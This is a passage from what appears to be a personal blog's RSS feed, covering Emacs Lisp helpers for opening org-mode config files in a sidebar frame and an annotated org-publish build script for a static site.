<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">my/config</span> ()
  <span class="org-doc">"Create a new for editing configuration"</span>

  (<span class="org-keyword">interactive</span>)
  (select-frame (make-frame '((name . <span class="org-string">"my/config"</span>)
                              (width . 150)
                              (height . 45))))
  (find-file <span class="org-string">"~/.emacs.d/config.org"</span>)
  (my/org-sidebar-toggle))
</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp" id="org4adadba">
(<span class="org-keyword">require</span> '<span class="org-constant">imenu</span>)
(<span class="org-keyword">require</span> '<span class="org-constant">imenu-list</span>)

(<span class="org-keyword">defun</span> <span class="org-function-name">my/org-tree-to-indirect-buffer</span> ()
  <span class="org-doc">"Create indirect buffer, narrow it to current subtree and unfold blocks"</span>

  (org-tree-to-indirect-buffer)
  (org-show-block-all)
  (<span class="org-keyword">setq-local</span> my/org-blocks-hidden nil))

(<span class="org-keyword">defun</span> <span class="org-function-name">my/org-sidebar</span> ()
  <span class="org-doc">"Open an imenu list on the left that allow navigation."</span>

  (<span class="org-keyword">interactive</span>)
  (<span class="org-keyword">setq</span> imenu-list-after-jump-hook #'my/org-tree-to-indirect-buffer
        imenu-list-position 'left
        imenu-list-size 36
        imenu-list-focus-after-activation t)

  (<span class="org-keyword">let</span> ((heading (substring-no-properties (<span class="org-keyword">or</span> (org-get-heading t t t t) <span class="org-string">""</span>))))
    (<span class="org-keyword">when</span> (buffer-base-buffer)
      (switch-to-buffer (buffer-base-buffer)))
    (imenu-list-minor-mode)
    (imenu-list-stop-timer)
    (hl-line-mode)
    (face-remap-add-relative 'hl-line <span class="org-builtin">:inherit</span> 'nano-subtle)
    (<span class="org-keyword">setq</span> header-line-format
          '(<span class="org-builtin">:eval</span>
            (nano-modeline-render nil
                                  (buffer-name imenu-list--displayed-buffer)
                                  <span class="org-string">"(outline)"</span>
                                  <span class="org-string">""</span>)))
    (<span class="org-keyword">setq-local</span> cursor-type nil)
    (<span class="org-keyword">when</span> (&gt; (length heading) 0)
      (goto-char (point-min))
      (search-forward heading)
      (imenu-list-display-dwim))))

</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">my/org-sidebar-toggle</span> ()
  <span class="org-doc">"Toggle the org-sidebar"</span>

  (<span class="org-keyword">interactive</span>)
  (<span class="org-keyword">if</span> (get-buffer-window <span class="org-string">"*Ilist*"</span>)
      (<span class="org-keyword">progn</span>
        (quit-window nil (get-buffer-window <span class="org-string">"*Ilist*"</span>))
        (switch-to-buffer (buffer-base-buffer)))
    (my/org-sidebar)))
</pre>
</div>

<p>
One does not really need to understand all of them. They just have to look at
the first one. The reason why this is the <i>path of least effort</i> is obvious. By
changing it <b>just a little bit</b>, we have the perfect end product:
</p>
</div>
</div>
<div id="outline-container-org1591a99" class="outline-4">
<h4 id="org1591a99"><span class="section-number-4">3.4.2.</span> <a href="#org1591a99">Merging them with our funcs</a></h4>
<div class="outline-text-4" id="text-3-4-2">
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)


(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/open-conf</span> ()
     <span class="org-doc">"Finds all ~config.org~ files within chatziiola/dot-dir and opens them up for you"</span>

  (<span class="org-keyword">interactive</span>)
  (<span class="org-keyword">let*</span> ((config-files (directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>))
         (prompt-list (seq-map (<span class="org-keyword">lambda</span> (e) (list (format <span class="org-string">"%-20s %-25s"</span> (chatziiola/get-keyword-value <span class="org-string">"TITLE"</span> e) e) e)) config-files))
         (prompt-answer (completing-read <span class="org-string">"Select configuration file: "</span> prompt-list))
         (cur-conf-file (car (last (assoc prompt-answer prompt-list)))))
      (select-frame (make-frame '((name . <span class="org-string">"my/config"</span>)
                                  (width . 150)
                                  (height . 45))))
      (find-file cur-conf-file))
  (my/org-sidebar-toggle)
)
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-orgdfba651" class="outline-2">
<h2 id="orgdfba651"><span class="section-number-2">4.</span> <a href="#orgdfba651">Making it usable</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Autoload the configuration function ( so that it is always available ), <i>stolen</i>
from <code>rougier</code>, once again.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(autoload 'chatziiola/open-conf
  (expand-file-name <span class="org-string">"init.el"</span> user-emacs-directory)
  <span class="org-doc">"Autoloaded my/config command."</span>
  t)

</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">;; </span><span class="org-comment">For those of you that don't use evil, you better start :P</span>
(evil-define-key 'normal 'global (kbd <span class="org-string">"&lt;leader&gt;fp"</span>) 'chatziiola/open-conf)
</pre>
</div>
</div>
</div>
<div id="outline-container-orgf8b15b7" class="outline-2">
<h2 id="orgf8b15b7"><span class="section-number-2">5.</span> <a href="#orgf8b15b7">Summing Up ( some extra details )</a></h2>
<div class="outline-text-2" id="text-5">
<p>
This article took for granted that one has some prior experience with org mode,
though I understand that this is not always the case. To gain advantage of the
scripts outlined above you only need to add the following lines at the beginning
of your <code>config.org</code> files:
</p>

<div class="org-src-container">
<pre class="src src-org"><span class="org-org-document-info-keyword">#+TITLE:</span> <span class="org-org-document-title">&lt;yourtitle&gt;</span>
<span class="org-org-meta-line">#+PROPERTY: header-args :tangle &lt;path-to-your-file&gt;</span>
</pre>
</div>

<p>
And enclose your code in source blocks such as these:
</p>
<p>
Lastly: Do not forget to add <code>config.org</code> to .stow-local-ignore to avoid clutter
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>Elisp Org-Publish Configuration</title>
<link>posts/20221228_elisp-org-publish-blog-configuration.html</link>
<pubDate>Sat, 09 Jul 2022 00:00:00 +0300</pubDate>
<guid>posts/20221228_elisp-org-publish-blog-configuration.html</guid>
<description>
<![CDATA[<p>
Before getting in greater depth: Huge thanks to an extraordinary member of the
Emacs community, whose (live) videos on YouTube, greatly helped me when I
decided to&#x2026; turn evil: David Wilson of <a href="https://systemcrafters.net/publishing-websites-with-org-mode/building-the-site/">System Crafters</a>
</p>

<p>
In fact, this configuration is fully based on the one he presented on his
YouTube <a href="https://www.youtube.com/c/SystemCrafters">channel</a>.
</p>

<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">;; </span><span class="org-comment">build-site.el -- Summary</span>

<span class="org-comment-delimiter">;;; </span><span class="org-comment">WARNING: DO NOT EDIT THIS FILE. The elisp file should not be edited. Visit</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">content/posts/20221228_elisp-org-publish-blog-configuration.org instead</span>

<span class="org-comment-delimiter">;;; </span><span class="org-comment">This is a configuration file for emacs to produce html code for my personal</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">website from plain org mode files. To achieve this I utilize the included</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">`</span><span class="org-comment"><span class="org-constant">ox-publish</span></span><span class="org-comment">' package as well as `</span><span class="org-comment"><span class="org-constant">htmlize</span></span><span class="org-comment">' (even though I can not understand</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">why it does not behave as I would like it to ) and parts of</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">`</span><span class="org-comment"><span class="org-constant">org-static-blog</span></span><span class="org-comment">'</span>

<span class="org-comment-delimiter">;;; </span><span class="org-comment">WARNING: DO NOT EDIT THIS FILE. The elisp file should not be edited. Visit</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">20221228_elisp-org-publish-blog-configuration.org instead</span>
<span class="org-comment-delimiter">;;; </span><span class="org-comment">Yup, it is needed twice to make sure I'll read it.</span>

<span class="org-comment-delimiter">;;; </span><span class="org-comment">Commentary:</span>
<span class="org-comment-delimiter">;;;; </span><span class="org-comment">TODO Someday I will write something here. Till then ;)</span>


<span class="org-comment-delimiter">;;;; </span><span class="org-comment">I changed/restructured quite some stuff after having a look at:</span>
<span class="org-comment-delimiter">;;;; </span><span class="org-comment">https://her.esy.fun/posts/0001-new-blog/index.html</span>

<span class="org-comment-delimiter">;;; </span><span class="org-comment">Code:</span>
<span class="org-comment-delimiter">;;;; </span><span class="org-comment">Only to stop flycheck </span>

</pre>
</div>
<div id="outline-container-orgff1da24" class="outline-2">
<h2 id="orgff1da24"><span class="section-number-2">1.</span> <a href="#orgff1da24">Getting the gist</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This is a literate configuration file, setting up and emacs instance to be run
on a simple virtual machine (Github actions). As such, you will not see most of
the options one cares for when setting up emacs. If you look at <a href="https://github.com/chatziiola/chatziiola.github.io">my shell script</a>,
you can see that I run emacs as <i>cleanly</i> as possible:
</p>

<div class="org-src-container">
<pre class="src src-shell">emacs -Q --script build-site.el
</pre>
</div>
</div>
</div>
<div id="outline-container-orgbff3347" class="outline-2">
<h2 id="orgbff3347"><span class="section-number-2">2.</span> <a href="#orgbff3347">Site-wide Variables</a></h2>
<div class="outline-text-2" id="text-2">
<p>
In this section of the configuration file I initialize the variables that I use
in the rest of the script. The goal here is to have no hard coded paths and/or
settings, and instead, rely on the modification of predefined variables to
change the behavior of already implemented features.
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defvar</span> <span class="org-variable-name">domainname</span> <span class="org-string">"https://blog.chatziiola.live"</span>
  <span class="org-doc">"Self-Descriptive. It is the address for which we build our site"</span>)
</pre>
</div>
</div>
<div id="outline-container-org98567c2" class="outline-3">
<h3 id="org98567c2"><span class="section-number-3">2.1.</span> <a href="#org98567c2">Content directories</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
To keep it simple:
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defvar</span> <span class="org-variable-name">base-dir</span> <span class="org-string">"./content/"</span>
  <span class="org-doc">"The content directory."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">public-dir</span> <span class="org-string">"./public/"</span>
  <span class="org-doc">"The root directory of our webserver."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">drafts-dir</span> (concat base-dir <span class="org-string">"drafts/"</span>)
  <span class="org-doc">"To be ignored when publishing."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">posts-dir</span> (expand-file-name <span class="org-string">"posts/"</span> base-dir)
  <span class="org-doc">"Subfolder of content where posts lie."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">posts-public-dir</span> (expand-file-name <span class="org-string">"posts/"</span> public-dir)
  <span class="org-doc">"The public subfolder in which posts will be published."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">src-dir</span> <span class="org-string">"./content/src/"</span>
  <span class="org-doc">"Self-descriptive."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">src-public-dir</span> <span class="org-string">"./public/src/"</span>
  <span class="org-doc">"Self-descriptive."</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-org7614327" class="outline-3">
<h3 id="org7614327"><span class="section-number-3">2.2.</span> <a href="#org7614327">CSS Path</a></h3>
<div class="outline-text-3" id="text-2-2">
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defvar</span> <span class="org-variable-name">css-path</span> <span class="org-string">"/src/rougier.css"</span>
  <span class="org-doc">"Self-descriptive."</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-orgfe24617" class="outline-3">
<h3 id="orgfe24617"><span class="section-number-3">2.3.</span> <a href="#orgfe24617">Head HTML</a></h3>
<div class="outline-text-3" id="text-2-3">
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defvar</span> <span class="org-variable-name">org-blog-head</span>
  (concat
   <span class="org-string">"&lt;link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"&gt;"</span>
   <span class="org-string">"&lt;link href=\"https://fonts.googleapis.com/css2?family=Fira+Sans&amp;display=swap\"rel=\"stylesheet\"&gt;"</span>
   <span class="org-string">"&lt;link href=\"https://fonts.googleapis.com/css2?family=Roboto+Condensed&amp;display=swap\"rel=\"stylesheet\"&gt;"</span>
   <span class="org-string">"&lt;link rel=\"stylesheet\" href=\""</span> css-path <span class="org-string">"\" /&gt;</span>
<span class="org-string">    &lt;link rel=\"icon\" type=\"image/x-icon\" href=\"/src/favicon.ico\"&gt;"</span>
   <span class="org-string">"&lt;meta charset=\"UTF-8\" name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;"</span>
   )
  <span class="org-doc">"Description - BLOG HTML HEAD."</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-org6add62e" class="outline-3">
<h3 id="org6add62e"><span class="section-number-3">2.4.</span> <a href="#org6add62e">Postamble</a></h3>
<div class="outline-text-3" id="text-2-4">
<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">defvar</span> <span class="org-variable-name">general-postamble</span>
  <span class="org-string">"&lt;p class=\"footer\"&gt; Made with Emacs and Org.&lt;br&gt;CSS theme based on the one developed by &lt;a href=\"https://github.com/rougier\"&gt;@rougier&lt;/a&gt;.&lt;/p&gt;"</span>
  <span class="org-doc">"To be used on all pages."</span>)

(<span class="org-keyword">defvar</span> <span class="org-variable-name">comments-postamble</span>
  (concat
   <span class="org-string">"&lt;script src=\"https://giscus.app/client.js\" data-repo=\"chatziiola/chatziiola.github.io\" data-repo-id=\"R_kgDOGq8p0g\" data-category=\"Announcements\" data-category-id=\"DIC_kwDOGq8p0s4COSFW\" data-mapping=\"pathname\" data-reactions-enabled=\"1\" data-emit-metadata=\"0\" data-input-position=\"bottom\" data-theme=\"light\" data-lang=\"en\" data-loading=\"lazy\" crossorigin=\"anonymous\" async&gt; &lt;/script&gt;"</span>
   <span class="org-string">"&lt;p class=\"date footer\"&gt; Originally created on %d &lt;/p&gt;"</span>
   general-postamble)
  <span class="org-doc">"Postamble for posts so that giscus comments are enabled."</span>)

</pre>
</div>
</div>
</div>
<div id="outline-container-orga96d37a" class="outline-3">
<h3 id="orga96d37a"><span class="section-number-3">2.5.</span> <a href="#orga96d37a">Org-static-blog index variables</a></h3>
<div class="outline-text-3" id="text-2-5">
<p>
Being the person that I am, striving for simplicity and creating chaos to get
there, I have taken parts of this wonderful package <a href="https://github.com/bastibe/org-static-blog">org-static-blog</a>, and
butchered it to my needs
</p>

<div class="org-src-container">
<pre class="src src-elisp">
<span class="org-comment-delimiter">;;;; </span><span class="org-comment">These were set up on a need-to-set basis</span>
(<span class="org-keyword">setq</span> org-static-blog-enable-tags t)
(<span class="org-keyword">setq</span> org-static-blog-index-file <span class="org-string">"recents.html"</span>)
(<span class="org-keyword">setq</span> org-static-blog-index-front-matter <span class="org-string">""</span>)
(<span class="org-keyword">setq</span> org-static-blog-index-length 50)
(<span class="org-keyword">setq</span> org-static-blog-posts-directory <span class="org-string">"./content/posts/"</span>)
(<span class="org-keyword">setq</span> org-static-blog-page-postamble general-postamble)
(<span class="org-keyword">setq</span> org-static-blog-publish-directory <span class="org-string">"./public/posts/"</span>)
(<span class="org-keyword">setq</span> org-static-blog-publish-title <span class="org-string">"Recent Articles"</span>)
(<span class="org-keyword">setq</span> org-static-blog-publish-url <span class="org-string">"https://chatziiola.github.io"</span>)

</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orgc7fb6fc" class="outline-2">
<h2 id="orgc7fb6fc"><span class="section-number-2">3.</span> <a href="#orgc7fb6fc">Package Settings&#xa0;&#xa0;&#xa0;<span class="tag"><span class="restructure">restructure</span></span></a></h2>
<div class="outline-text-2" id="text-3">
<p>
These are pretty basic settings, only required in order for us to call a <i>clean</i>
emacs instance. A separate directory for packages is specified in order to not
liter our <b>actual</b> Emacs directory.
</p>

<p>
While one could avoid using extra packages ( as I have tried doing ) and keep it
as simple as possible, it is not smart to reinvent the wheel. If the desired
functionality is provided by a third party package, use it.
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> make-backup-files nil
      auto-save-default nil
      create-lockfiles nil)

</pre>
</div>


<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">require</span> '<span class="org-constant">package</span>)
(<span class="org-keyword">setq</span> package-archives '((<span class="org-string">"melpa"</span> . <span class="org-string">"https://melpa.org/packages/"</span>)
                         (<span class="org-string">"elpa"</span> . <span class="org-string">"https://elpa.gnu.org/packages/"</span>)))

(<span class="org-keyword">setq</span> user-emacs-directory (expand-file-name <span class="org-string">"./.packages"</span>))
(<span class="org-keyword">setq</span> package-user-dir user-emacs-directory)

<span class="org-comment-delimiter">;;; </span><span class="org-comment">Initialize the package system</span>
(package-initialize)
(<span class="org-keyword">unless</span> package-archive-contents
  (package-refresh-contents))

</pre>
</div>

<p>
Loading emacs does not mean that the publishing functions and variables have
already been loaded. The following lines ensures that we have successfully
loaded the actual publishing system
</p>
<div class="org-src-container">
<pre class="src src-elisp">
<span class="org-comment-delimiter">;; </span><span class="org-comment">Load the publishing system</span>
(<span class="org-keyword">require</span> '<span class="org-constant">ox-publish</span>)
(<span class="org-keyword">require</span> '<span class="org-constant">ox-html</span>)
(<span class="org-keyword">require</span> '<span class="org-constant">cl-extra</span>)

</pre>
</div>

<p>
Installing <code>use-package</code>
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">;; </span><span class="org-comment">Install dependencies</span>
<span class="org-comment-delimiter">;; </span><span class="org-comment">htmlize is needed for proper code formatting:</span>
<span class="org-comment-delimiter">;; </span><span class="org-comment">https://stackoverflow.com/questions/24082430/org-mode-no-syntax-highlighting-in-exported-html-page</span>
(<span class="org-keyword">eval-when-compile</span>
  (add-to-list 'load-path (expand-file-name <span class="org-string">"use-package"</span> default-directory))
  (<span class="org-keyword">require</span> '<span class="org-constant">use-package</span>))

(<span class="org-keyword">use-package</span> htmlize)
</pre>
</div>
</div>
</div>
<div id="outline-container-org7efbd14" class="outline-2">
<h2 id="org7efbd14"><span class="section-number-2">4.</span> <a href="#org7efbd14">Org To Html Settings</a></h2>
<div class="outline-text-2" id="text-4">
<p>
These are settings that are used during the conversion of my org files
(articles) to html files. Under certain circumstances they can be overwritten
from the <code>org-projects-alist</code>&rsquo; options.
</p>


<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">setq</span> org-src-fontify-natively t)
(<span class="org-keyword">setq</span> org-html-htmlize-output-type 'css)

(<span class="org-keyword">setq</span> org-src-fontify-natively t                <span class="org-comment-delimiter">; </span><span class="org-comment">Fontify code in code blocks.</span>
      org-adapt-indentation nil                 <span class="org-comment-delimiter">; </span><span class="org-comment">Adaptive indentation</span>
      org-src-tab-acts-natively t               <span class="org-comment-delimiter">; </span><span class="org-comment">Tab acts as in source editing</span>
      org-confirm-babel-evaluate nil            <span class="org-comment-delimiter">; </span><span class="org-comment">No confirmation before executing code</span>
      org-edit-src-content-indentation 2        <span class="org-comment-delimiter">; </span><span class="org-comment">No relative indentation for code blocks</span>
      org-fontify-whole-block-delimiter-line t) <span class="org-comment-delimiter">; </span><span class="org-comment">Fontify whole block</span>


<span class="org-comment-delimiter">;; </span><span class="org-comment">Customize the HTML output</span>
(<span class="org-keyword">setq</span> org-html-validation-link nil
      org-html-head-include-scripts nil
      org-html-head-include-default-style nil
      org-html-indent nil
      org-html-self-link-headlines t
      org-export-with-tags t
      org-export-with-smart-quotes t
      org-html-head org-blog-head)
</pre>
</div>
</div>
</div>
<div id="outline-container-org6807d59" class="outline-2">
<h2 id="org6807d59"><span class="section-number-2">5.</span> <a href="#org6807d59">Babel</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Babel-related settings. I&rsquo;m pretty sure I had this enabled for a fancier feature
than simply highlighting but I&rsquo;m not 100% sure.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(org-babel-do-load-languages
 'org-babel-load-languages
 '((emacs-lisp . t)
   (gnuplot . t)
   (haskell . nil)
   (latex . t)
   (octave . t)
   (python . t)
   (matlab . t)
   (shell . t)
   (ruby . t)
   (sql . nil)
   (sqlite . t)))
</pre>
</div>
</div>
</div>
<div id="outline-container-orgf63064d" class="outline-2">
<h2 id="orgf63064d"><span class="section-number-2">6.</span> <a href="#orgf63064d">Series next/before links&#xa0;&#xa0;&#xa0;<span class="tag"><span class="INACTIVE">INACTIVE</span></span></a></h2>
<div class="outline-text-2" id="text-6">
<p>
This is a functionality that I long wanted to have implemented.  Now, although
this works perfectly, it creates a restriction: The files are chronologically
inserted in the previous/next &ldquo;queue&rdquo;. This means that in the case of lectures,
which I have irregularly published at times, there may be a slight confusion. To
avoid this causing a problem we must be careful with the dates in the filenames
of <i>forced</i> lectures.
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org5699b5a">(<span class="org-keyword">defun</span> <span class="org-function-name">my-find-next-previous-series-article</span> (file)
  <span class="org-doc">"Find the filenames of the next and previous article, if they exist, in the same directory as FILE.</span>
<span class="org-doc">   This function acts only on lectures (files starting with 'lec_.) as of now.</span>
<span class="org-doc">The filenames are returned in HTML format."</span>
  (<span class="org-keyword">when</span> (string-prefix-p <span class="org-string">"lec_"</span> (file-name-nondirectory file))
    (<span class="org-keyword">let*</span> ((dir (file-name-directory file))
           (name (file-name-nondirectory file))
           (files (sort (directory-files dir nil <span class="org-string">"^lec_.*\\.org$"</span>) 'string&lt;))
           (index (cl-position name files <span class="org-builtin">:test</span> 'equal)))

        <span class="org-comment-delimiter">;; </span><span class="org-comment">This is a hack to ensure that the files get returned with the .html extension</span>
        (<span class="org-keyword">let</span> ((prev (<span class="org-keyword">if</span> (<span class="org-keyword">and</span> (&gt; index 0) (nth (1- index) files))
                             (concat (file-name-sans-extension (nth (1- index) files)) <span class="org-string">".html"</span>)))
              (next 
                    (<span class="org-keyword">if</span> (<span class="org-keyword">and</span> (&lt; index (1- (length files))) (nth (1+ index) files))
                        (concat (file-name-sans-extension (nth (1+ index) files)) <span class="org-string">".html"</span>))))
          (cons prev next))))
  )

</pre>
</div>

<p>
This function works really well the preceding one yet is not ideal. It inserts
the content at the end of the org mode buffer, causing problems with footnotes,
where they exist.
</p>
<div class="org-src-container">
<pre class="src src-elisp" id="orgca34dcd">(<span class="org-keyword">defun</span> <span class="org-function-name">my-add-links-to-next-previous-series-article</span> (backend)
  <span class="org-doc">"Add links to the previous and next series articles, if they exist."</span>
  (<span class="org-keyword">when</span> (org-export-derived-backend-p backend 'html)
    (<span class="org-keyword">let</span> ((prev-next (my-find-next-previous-series-article (buffer-file-name))))
      (<span class="org-keyword">when</span> prev-next
        (<span class="org-keyword">let</span> ((prev (car prev-next))
              (next (cdr prev-next)))
          (<span class="org-keyword">when</span> (<span class="org-keyword">or</span> prev next)
            (goto-char (point-max))
            (forward-line 1)
            (insert <span class="org-string">"\n#+begin_export html\n"</span>)
            (insert <span class="org-string">"&lt;div class=\"series-navigation-div\"&gt;\n"</span>)
            (<span class="org-keyword">when</span> prev (insert (format <span class="org-string">"&lt;p&gt;&lt;a class=\"nav-button previous-nav-button\" href=\"%s\"&gt;Previous&lt;/a&gt;&lt;/p&gt;\n"</span> prev)))
            (<span class="org-keyword">when</span> next (insert (format <span class="org-string">"&lt;p&gt;&lt;a class=\"nav-button next-nav-button\" href=\"%s\"&gt;Next&lt;/a&gt;&lt;/p&gt;\n"</span> next)))
            (insert <span class="org-string">"&lt;/div&gt;\n"</span>)
            (insert <span class="org-string">"#+end_export"</span>)))))))

(add-hook 'org-export-before-parsing-hook 'my-add-links-to-next-previous-series-article)
</pre>
</div>


<p>
The perfect solution would be one like the preceding, the only problem with this
one is that it no longer works with the find-previous-next algorithm, since we
do not know which html files are created (only the previous one exists, the we
can not add a next button).
</p>
<div class="org-src-container">
<pre class="src src-elisp" id="org5322567">
(<span class="org-keyword">defun</span> <span class="org-function-name">my-add-links-to-next-previous-series-article</span> ()
  <span class="org-doc">"Add links to the previous and next series  articles, if they exist."</span>
  (<span class="org-keyword">let</span> ((prev-next (my-find-next-previous-series-article (buffer-file-name))))
    (<span class="org-keyword">when</span> prev-next
      (<span class="org-keyword">let</span> ((prev (car prev-next))
            (next (cdr prev-next)))
        (goto-char (point-max))
        (<span class="org-keyword">unless</span> (re-search-backward <span class="org-string">"&lt;div id=\"postamble\""</span> nil t)
          (<span class="org-warning">error</span> <span class="org-string">"Could not find postamble div"</span>))
        (insert <span class="org-string">"\n&lt;div class=\"series-navigation-div\"&gt;\n"</span>)
        (<span class="org-keyword">when</span> prev (insert (format <span class="org-string">"&lt;p&gt;&lt;a class=\"nav-button previous-nav-button\" href=\"%s\"&gt;Previous&lt;/a&gt;&lt;/p&gt;\n"</span> prev)))
        (<span class="org-keyword">when</span> next (insert (format <span class="org-string">"&lt;p&gt;&lt;a class=\"nav-button next-nav-button\" href=\"%s\"&gt;Next&lt;/a&gt;&lt;/p&gt;\n"</span> next)))
        (insert <span class="org-string">"&lt;/div&gt;\n"</span>)
        ))))

(add-hook 'org-export-after-parsing-hook #'my-add-links-to-next-previous-series-article)

</pre>
</div>
</div>
</div>
<div id="outline-container-org086ab8a" class="outline-2">
<h2 id="org086ab8a"><span class="section-number-2">7.</span> <a href="#org086ab8a">Tips:</a></h2>
<div class="outline-text-2" id="text-7">
<p>
One could use relative paths (even though I now (<span class="timestamp-wrapper"><span class="timestamp">&lt;2023-01-01 Sun&gt;</span></span>) find some
problems with this approach, as it breaks some stuff when creating index pages),
to ensure that no faulty links exist.
</p>
</div>
</div>
<div id="outline-container-orgd3d6483" class="outline-2">
<h2 id="orgd3d6483"><span class="section-number-2">8.</span> <a href="#orgd3d6483">Project Alist</a></h2>
<div class="outline-text-2" id="text-8">
<p>
Org publishing works with projects, a fancy way to call files and directories.
</p>

<p>
There are four projects, with different variables and settings:
</p>
<ol class="org-ol">
<li><a href="#org7a7f008">Org-files</a>, all org files in my <code>/content</code> folder</li>
<li><a href="#org3bf13d2">Blog-posts</a>, all org files in my <code>/content/posts</code> folder</li>
<li><a href="#org63ad260">Images</a>, images in <code>/content/images</code></li>
<li><a href="#orgde8fd10">Static</a>, html and css files in <code>/content/src</code></li>
</ol>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> org-publish-project-alist
      (list
</pre>
</div>
</div>
<div id="outline-container-org264eaff" class="outline-4">
<h4 id="org264eaff"><span class="section-number-4">8.0.1.</span> <a href="#org264eaff">The Brief</a></h4>
<div class="outline-text-4" id="text-8-0-1">
<p>
The <code>org</code> mode files ( the articles ) exist in the <code>/contents/</code> folder, which is
where I&rsquo;m working. We want to automate the process of converting these files to
html and moving this web-friendly version to the <code>/public</code> directory, which is
the root directory of our web server.
</p>

<p>
To achieve that we first convert all org mode files
</p>
</div>
</div>
<div id="outline-container-org5930a00" class="outline-4">
<h4 id="org5930a00"><span class="section-number-4">8.0.2.</span> <a href="#org5930a00">Summing up</a></h4>
<div class="outline-text-4" id="text-8-0-2">
<ol class="org-ol">
<li>Order is crucial, since the export is sequential and the later exports may
overwrite previous ones.</li>
</ol>
</div>
</div>
<div id="outline-container-org7a7f008" class="outline-3">
<h3 id="org7a7f008"><span class="section-number-3">8.1.</span> <a href="#org7a7f008">Org-files</a></h3>
<div class="outline-text-3" id="text-8-1">
<div class="org-src-container">
<pre class="src src-elisp">(list <span class="org-string">"org-files"</span>
</pre>
</div>

<p>
It contains all files in <code>/content/</code> except for my draft articles. ( It should
work like that, however drafts are currently being exported&#x2026; Maybe someone
notices the error here and proposes a solution in the comments )
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:base-directory</span> base-dir
<span class="org-builtin">:base-extension</span> <span class="org-string">"org"</span>
<span class="org-builtin">:exclude</span> drafts-dir
</pre>
</div>


<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:recursive</span> t
</pre>
</div>


<p>
Kinda general, the publishing function and where to publish
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:html-link-home</span> <span class="org-string">"/index.html"</span>
<span class="org-builtin">:html-link-up</span> <span class="org-string">"../index.html"</span>
<span class="org-builtin">:html-postamble</span> general-postamble
<span class="org-builtin">:publishing-directory</span> public-dir
<span class="org-builtin">:publishing-function</span> 'org-html-publish-to-html
</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:with-author</span> nil           <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include author name</span>
<span class="org-builtin">:with-creator</span> nil            <span class="org-comment-delimiter">;; </span><span class="org-comment">Include Emacs and Org versions in footer</span>
<span class="org-builtin">:with-drawers</span> t
<span class="org-builtin">:headline-level</span> 4
</pre>
</div>

<p>
Table of contents has been taken <i>offline</i> due to the fact that I did not
like how it looked.
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:with-toc</span> nil
</pre>
</div>


<p>
Section numbers do not work with my <code>css</code> since it provides numbering.
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:section-numbers</span> nil       <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include section numbers</span>
</pre>
</div>

<p>
This is a setting that gets overwritten for blog posts but it essentially
makes the home button to point to the home page of my website and the up
button to go a directory higher.
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:html-link-home</span> <span class="org-string">"/index.html"</span>
<span class="org-builtin">:html-link-up</span> <span class="org-string">"../index.html"</span>
</pre>
</div>

<p>
This could be a rather useful entry, if there was maybe an integration
with version control so that files would only get published if the had
been edited. The problem is that it makes all posts have the same date
and that does not look nice. A better way to deal with this problem is
the <code>#+DATE:</code> header at the top of blog posts.
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:time-stamp-file</span> nil)
</pre>
</div>
</div>
</div>
<div id="outline-container-org3bf13d2" class="outline-3">
